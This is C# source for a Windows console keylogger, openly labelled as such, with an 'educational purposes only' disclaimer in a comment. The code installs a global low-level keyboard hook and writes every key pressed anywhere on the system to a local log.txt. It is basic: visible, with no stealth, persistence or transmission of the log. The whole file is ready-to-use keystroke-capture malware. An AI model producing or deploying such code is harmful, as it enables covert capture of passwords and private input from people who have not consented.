using System;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;

namespace KeylogApplication
{
    /*
         This code is a basic implementation of a keylogger software in C# console application. 
        It captures keydown events, saves the pressed keys to a log file, and provides a way to exit the program.
        Please note that using keyloggers without proper authorization is illegal and unethical. 
        This code is provided for educational purposes only.
     */
    class Program
    {
        private const int WH_KEYBOARD_LL = 13;
        private const int WM_KEYDOWN = 0x0100;

        private static IntPtr hookId = IntPtr.Zero;
        private static StreamWriter sw;

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc callback, IntPtr hMod, uint dwThreadId);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool UnhookWindowsHookEx(IntPtr hhk);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);

        [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr GetModuleHandle(string lpModuleName);

        private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);

        static void Main(string[] args)
        {
            hookId = SetHook(HookCallback);
            sw = new StreamWriter("log.txt", true);

            Console.WriteLine("Keylogger started. Press any key to exit...");
            Console.ReadKey();

            UnhookWindowsHookEx(hookId);
            sw.Close();
        }

        private static IntPtr SetHook(LowLevelKeyboardProc proc)
        {
            using (ProcessModule module = Process.GetCurrentProcess().MainModule)
            {
                return SetWindowsHookEx(WH_KEYBOARD_LL, proc, GetModuleHandle(module.ModuleName), 0);
            }
        }

        private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
        {
            if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN)
            {
                int vkCode = Marshal.ReadInt32(lParam);
                string key = ((ConsoleKey)vkCode).ToString();

                sw.WriteLine(key);
                sw.Flush();
            }

            return CallNextHookEx(hookId, nCode, wParam, lParam);
        }
    }
}
